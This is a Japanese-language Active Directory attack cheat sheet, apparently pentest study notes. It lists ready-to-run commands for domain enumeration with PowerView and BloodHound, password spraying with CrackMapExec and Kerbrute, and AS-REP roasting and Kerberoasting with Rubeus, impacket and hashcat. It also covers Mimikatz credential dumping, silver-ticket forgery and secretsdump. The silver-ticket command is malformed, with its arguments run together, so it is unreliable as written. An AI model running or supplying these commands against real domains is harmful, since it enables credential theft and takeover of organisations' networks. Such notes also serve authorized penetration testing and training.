## 目次
1. [Enumeration](#enumeration)
2. [Powerview](#powerview)
3. [Bloodhound](#bloodhound)
4. [PsLoggedon](#psloggedon)
5. [Password Spraying](#password-spraying)
6. [AS-REP Roasting](#as-rep-roasting)
7. [Kerberoasting](#kerberoasting)
8. [Silver Tickets](#silver-tickets)
9. [Secretsdump](#secretsdump)
10. [サイト](#サイト)
## Enumeration
ドメインに参加しているマシンでローカル管理者を確認する:
```bash
net localgroup Administrators
```
---

## Powerview
```bash
Import-Module .\PowerView.ps1 # PowerShellでモジュールをロード、エラーが発生した場合は実行ポリシーを変更
Get-NetDomain # ドメインの基本情報を取得
Get-NetUser # ドメイン内のすべてのユーザーをリスト
```
- 上記コマンドの出力は、`select`コマンドを使用してフィルタリングできます。たとえば、`Get-NetUser | select cn`のように、`cn`は出力のサブヘッダーです。

```markdown
Get-NetGroup # ドメイングループを列挙
Get-NetGroup "group name" # 特定グループの情報を取得
Get-NetComputer # ドメイン内のコンピュータオブジェクトを列挙
Find-LocalAdminAccess # 現在のユーザーがドメイン内の任意のコンピュータに管理者権限を持っているかどうかをスキャン
Get-NetSession -ComputerName files04 -Verbose # Get-NetSessionでログオン中のユーザーを確認、詳細情報を追加
Get-NetUser -SPN | select samaccountname,serviceprincipalname # ドメイン内のSPNアカウントをリスト
Get-ObjectAcl -Identity <user> # ACE(アクセス制御エンティティ)を列挙し、SID(セキュリティ識別子)をリスト
Convert-SidToName <sid/objsid> # SID/ObjSIDを名前に変換

# 特定グループに対する「GenericAll」権限をチェック。取得後、convert-sidtonameを使用して変換可能
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Find-DomainShare # ドメイン内の共有を検索

Get-DomainUser -PreauthNotRequired -verbose # AS-REP Roastingの対象となるアカウントを特定

Get-NetUser -SPN | select serviceprincipalname # Kerberoastingの対象となるアカウント
---
```

## Bloodhound
### Collection methods - database

```bash
# Sharphound - sharphound.ps1を侵害されたマシンに転送
Import-Module .\Sharphound.ps1 
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # 指定された詳細で収集し、出力がWindowsマシンに保存される

# Bloodhound-Python
bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all # 出力はKaliマシンに保存される
```

### Bloodhoundの実行
```bash
sudo neo4j console
```
- 次に取得した.jsonファイルをアップロードします。
---

## PsLoggedon
### ドメインのリモートシステムでのユーザーログオンを見る (外部ツール)
```bash
.\PsLoggedon.exe \\<computername>
```
---

## Password Spraying
### Crackmapexec - 出力に「Pwned!」と表示されるか確認
```bash
crackmapexec smb <IPまたはサブネット> -u users.txt -p 'pass' -d <domain> --continue-on-success # サブネットの場合、continue-on-successオプションを使用
```

### Kerbrute
```bash
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```
---

## AS-REP Roasting
### AS-REP Roastingの対象となるアカウントのハッシュを取得、Kali Linuxから実行
```bash
.\Rubeus.exe asreproast /nowrap
# 侵害されたWindowsホストからダンプ
```

```bash
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request
```

### ハッシュのクラック
```bash
hashcat -m 18200 hashes.txt wordlist.txt --force
```
---

## Kerberoasting
```bash
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast # 侵害されたWindowsホストからダンプし、カスタム名で保存
```

```bash
impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request # Kaliマシンから実行
```

```bash
hashcat -m 13100 hashes.txt wordlist.txt --force # ハッシュのクラック
```
---

## Silver Tickets
### Mimikatzを使用してSPNユーザーのハッシュを取得
```bash
privilege::debug
sekurlsa::logonpasswords # ここでSPNアカウントのNTLMハッシュを取得
```

#### ドメインSIDの取得
```bash
ps>whoami /user
# ログインしているユーザーのSIDを取得。ユーザーのSIDが "S-1-5-21-1987370270-658905905-1781884369-1105" の場合、ドメインSIDは "S-1-5-21-1987370270-658905905-1781884369"
```

#### Silver Ticketの偽造 (Mimikatz)
```bash
kerberos::golden /sid:<domainSID>/domain:<domain-name>/ptt /target:<targetsystem.domain>/service:<service-name>/rc4:<NTLM-hash>/user:<new-user>exit
```

#### チケットの確認
```bash
ps>klist
```

### サービスへのアクセス
```bash
ps> iwr -UseDefaultCredentials <servicename>://<computername>
```
---

## Secretsdump
```bash
secretsdump.py <domain>/<user>:<password>@<IP>
```

## サイト
- ＡＤの攻撃情報
https://wadcoms.github.io/#